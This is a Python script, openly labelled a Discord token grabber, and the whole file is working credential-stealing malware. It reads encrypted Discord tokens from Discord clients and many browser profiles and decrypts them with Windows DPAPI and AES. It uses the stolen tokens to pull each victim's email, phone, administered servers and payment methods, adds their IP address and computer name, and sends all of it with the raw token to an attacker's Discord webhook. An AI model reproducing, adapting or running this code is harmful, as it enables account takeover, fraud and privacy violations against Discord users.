import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import urllib.parse
import re
import base64
import datetime
import argparse

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt  # type: ignore
from Crypto.Cipher import AES  # type: ignore

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def extract_tokens():
    """Extract Discord tokens from local files and return structured data"""
    checked = []
    results = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                # Get user information
                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                # Get badges
                badges = []
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges.append("BadgeBravery")
                if flags == 128 or flags == 160:
                    badges.append("BadgeBrilliance")
                if flags == 256 or flags == 288:
                    badges.append("BadgeBalance")

                # Get guilds information
                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                admin_guilds = []

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:  # Admin or Manage Guild
                        try:
                            guild_res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                            admin_guilds.append({
                                'name': guild['name'],
                                'member_count': guild['approximate_member_count'],
                                'vanity_url': guild_res.get("vanity_url_code")
                            })
                        except:
                            admin_guilds.append({
                                'name': guild['name'],
                                'member_count': guild['approximate_member_count'],
                                'vanity_url': None
                            })

                # Get Nitro information
                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges.append("BadgeSubscriber")
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%Y-%m-%d %H:%M:%S')

                # Get boost information
                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available_boosts = 0
                boost_slots = []
                for slot in res:
                    cooldown = datetime.datetime.strptime(slot["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    is_available = cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0)
                    boost_slots.append({
                        'available': is_available,
                        'cooldown_ends': cooldown.strftime('%Y-%m-%d %H:%M:%S') if not is_available else None
                    })
                    if is_available:
                        available_boosts += 1

                if boost_slots:
                    badges.append("BadgeBoost")

                # Get payment methods
                payment_methods = []
                try:
                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode())
                    for method in res:
                        if method['type'] == 1:  # Credit Card
                            payment_methods.append({
                                'type': 'CreditCard',
                                'valid': not method.get('invalid', False)
                            })
                        elif method['type'] == 2:  # PayPal
                            payment_methods.append({
                                'type': 'PayPal',
                                'valid': not method.get('invalid', False)
                            })
                except:
                    payment_methods = []

                # Create user data object
                user_data = {
                    'token': token,
                    'verified': True,
                    'extraction_time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'platform': platform,
                    'user_info': {
                        'id': res_json['id'],
                        'username': res_json['username'],
                        'discriminator': res_json.get('discriminator', '0'),
                        'email': res_json.get('email'),
                        'phone': res_json.get('phone'),
                        'mfa_enabled': res_json.get('mfa_enabled', False),
                        'locale': res_json.get('locale'),
                        'verified': res_json.get('verified', False),
                        'flags': flags,
                        'badges': badges,
                        'avatar_url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json.get('avatar')}.png" if res_json.get('avatar') else None
                    },
                    'guilds': {
                        'total_count': guilds,
                        'admin_guilds': admin_guilds
                    },
                    'nitro': {
                        'has_nitro': has_nitro,
                        'expiration_date': exp_date
                    },
                    'boosts': {
                        'available': available_boosts,
                        'slots': boost_slots
                    },
                    'payment_methods': payment_methods,
                    'system_info': {
                        'ip': getip(),
                        'username': os.getenv("UserName"),
                        'computer_name': os.getenv("COMPUTERNAME")
                    }
                }

                results.append(user_data)

            except (urllib.error.HTTPError, json.JSONDecodeError):
                continue
            except Exception as e:
                print(f"ERROR processing token: {e}")
                continue

    return results

def main():
    """Legacy main function for webhook mode"""
    parser = argparse.ArgumentParser(description='Discord Token Grabber')
    parser.add_argument('--webhook', help='Discord webhook URL for sending results')
    parser.add_argument('--json', action='store_true', help='Output results as JSON instead of sending to webhook')

    args = parser.parse_args()

    if args.json:
        # JSON output mode for integration
        try:
            results = extract_tokens()
            output_data = {
                'success': True,
                'tokens_found': len(results),
                'extraction_timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'tokens': results
            }
            
            # Save to discord_tokens.json file for monitoring
            output_file = os.path.join(os.path.dirname(__file__), 'discord_tokens.json')
            with open(output_file, 'w') as f:
                json.dump(output_data, f, indent=2)
            
            print(json.dumps(output_data, indent=2))
        except Exception as e:
            error_data = {
                'success': False,
                'error': str(e),
                'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            print(json.dumps(error_data, indent=2))
    else:
        # Legacy webhook mode
        webhook_url = args.webhook or input("Enter Discord webhook URL: ")
        results = extract_tokens()

        for user_data in results:
            embed_user = {
                    'embeds': [
                        {
                        'title': f"**New user data: {user_data['user_info']['username']}**",
                        'description': f"""```yaml
User ID: {user_data['user_info']['id']}
Email: {user_data['user_info']['email']}
Phone Number: {user_data['user_info']['phone']}
Guilds: {user_data['guilds']['total_count']}
MFA Enabled: {user_data['user_info']['mfa_enabled']}
Verified: {user_data['user_info']['verified']}
Has Nitro: {user_data['nitro']['has_nitro']}
Boosts Available: {user_data['boosts']['available']}
Payment Methods: {len(user_data['payment_methods'])}
IP: {user_data['system_info']['ip']}
Token Location: {user_data['platform']}
```Token:
```yaml
{user_data['token']}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Astraa ・ https://github.com/astraadev"
                            },
                            'thumbnail': {
                            'url': user_data['user_info']['avatar_url']
                            }
                        }
                    ],
                    "username": "Grabber",
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

            try:
                urllib.request.urlopen(urllib.request.Request(
                    webhook_url,
                    data=json.dumps(embed_user).encode('utf-8'),
                    headers=getheaders(),
                    method='POST'
                )).read().decode()
                print(f"✅ Sent data for user: {user_data['user_info']['username']}")
            except Exception as e:
                print(f"❌ Failed to send data for user: {user_data['user_info']['username']} - {e}")

        print(f"🎉 Extraction complete! Found {len(results)} tokens")

if __name__ == "__main__":
    main()